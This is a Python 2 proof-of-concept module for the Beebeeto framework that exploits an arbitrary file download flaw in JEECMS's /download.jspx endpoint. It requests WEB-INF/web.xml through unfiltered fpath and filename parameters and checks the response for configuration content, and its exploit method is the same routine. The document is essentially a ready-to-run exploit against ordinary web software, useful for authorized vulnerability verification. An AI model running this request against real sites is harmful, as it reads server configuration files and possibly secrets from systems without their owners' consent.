#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0088',
            'name': 'JEECMS /download.jspx Arbitrary File Download POC',
            'author': 'flsf',
            'create_date': '2014-10-20',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'JEECMS',
            'vul_version': ['*'],
            'type': 'Arbitrary File Download',
            'tag': ['JEECMS漏洞', '/download.jspx', 'Arbitrary File Download'],
            'desc': '/download.jspx 文件用于文件下载,fpath及filename参数未做正确过滤限制,导致可下载任意文件',
            'references': ['http://wooyun.org/bugs/wooyun-2014-077960',
                           ],
        },
    }

    @classmethod
    def verify(cls, args):
        verify_url = args['options']['target'] + "/download.jspx?fpath=WEB-INF/web.xml&filename=WEB-INF/web.xml"
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        request = urllib2.Request(verify_url)
        response = urllib2.urlopen(request)
        content = response.read()
        if 'WEB-INF/config/' in content and 'contextConfigLocation' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
            return args
        args['success'] = False
        return args

    exploit = verify

if __name__ == "__main__":
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())